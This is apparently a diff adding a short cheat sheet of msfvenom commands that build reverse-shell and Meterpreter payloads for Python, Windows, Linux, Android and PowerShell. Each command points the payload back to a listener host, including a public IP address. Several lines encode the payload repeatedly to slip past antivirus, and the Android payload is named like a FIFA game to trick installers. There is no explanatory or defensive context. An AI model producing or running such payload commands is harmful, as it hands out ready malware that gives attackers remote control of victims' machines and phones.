@@ -1,0 +1,15 @@
+# Python meterpreter reverse tcp
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f raw > python_m.py
+msfvenom -p python/meterpreter/reverse_tcp LHOST=34.213.170.51 LPORT=4444 -f raw > python_m.pyw
+
+# windows reverse meterpreter
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 50 LHOST=192.168.1.103 LPORT=4444 -f exe > mns.exe
+
+# linux reverse shell
+msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.192.166.14 LPORT=4444 -e x86/shikata_ga_nai -i 50 -b "\x00" -f elf > linux_shell.elf
+
+# Android
+ msfvenom -p android/meterpreter/reverse_https LHOST=34.213.170.51 LPORT=4444 R > fifa2016.apk
+ 
+ # Windows PowerShell
+  msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out ps_meterpreter.ps1 LHOST=34.213.170.51 LPORT=61771
